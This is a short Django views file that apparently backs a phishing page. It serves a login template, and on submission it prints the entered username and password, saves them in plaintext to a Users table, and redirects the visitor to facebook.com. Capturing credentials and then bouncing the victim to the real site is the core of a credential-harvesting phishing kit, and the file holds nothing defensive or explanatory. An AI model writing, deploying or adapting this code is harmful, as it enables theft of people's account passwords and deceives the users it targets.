"""
Definition of views.
"""

from django.shortcuts import render, redirect
from django.http import HttpRequest, HttpResponse, HttpResponseRedirect
from django.template import RequestContext
from datetime import datetime
from app.models import Users

def home(request):
    """Renders the home page."""
    assert isinstance(request, HttpRequest)
    if request.method == 'POST':
        u = request.POST.get('username', '')
        p = request.POST.get('password', '')
        print("Naolll",u ,p)
        u = Users(username = u,password = p)
        u.save();
        return redirect('http://facebook.com/')
    elif request.method == 'GET': 
        return render(
            request,
            'app/login.html'
        )
